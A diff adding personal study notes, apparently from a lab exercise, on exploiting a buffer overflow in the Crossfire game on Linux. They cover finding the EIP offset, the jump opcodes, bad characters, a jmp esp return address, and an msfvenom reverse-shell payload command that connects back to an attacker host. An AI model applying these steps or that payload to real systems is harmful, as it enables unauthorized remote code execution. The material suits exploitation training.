@@ -1,0 +1,62 @@
+#memory protection
+DEP - data execution prevention
+ASLR - address spaces layout randomization
+Canaries - stack canaries
+
+Our test environment won't have this memory protection
+Crossfire game
+edb <- linux debuger
+
+File -> attach -> select crossfire process -> okey
+F9 for run
+
+#Find wich bytes overwrite the EIP
+To find wich bytes overrite the EIP
+use: to make our unique pattern string
+msf-pattern_create -l 4379
+
+msf-patter_offset -q 46367046
+Offset 4368
+EIP 4 bytes characters
+
+#Locating space for our shellcode
+We can't attempt to  increase the space after the crush
+EAX points to the start of our buffer
+
+We will jump to the start of our buffer jumping the first 12 instructions and add our shellcode in the start of our stack
+
+msf-nasm_shell
+add eax,12
+83C00C
+jmp eax
+FFE0
+
+#Checking for bad characters
+Send all 0x00 - 0xFF characters and check the bad characters for the crossfire app
+
+\0x00
+\0x20
+
+#Finding a return address
+Plugins -> OpcodeSearcher -> Search
+Choose your application
+Jump equivalent -> ESP -> EIP
+
+Use first jmp esp found by the debuger
+
+Set a break point plugins -> breakpointmanager breakpoint -> add breakpoint and paste the address of the jmp esp
+
+We add the eip address to the jmp esp (remember litle endian)
+On esp there is the add eax and the jmp eax where it jump to the start jumping the fisrt lines going to our AAA string.
+
+#Getting a shell
+We need to drop our payload in the start
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST={IP} LPORT={PORT} -b "\x00\x20" -f py -v shellcode
+
+We will add some nops at the start in case of a decoding or something strange.
+Here the buffer overflow will:
+- Change EIP with the "jmp esp" address, go to ESP and add the eax to bypass the first positions of the buffer overlfow, follow with jmp eax and jumping on the start where we added some nops that passes and after all will execute our shellcode
+
+Remember to run the application without a debugger attached.
+
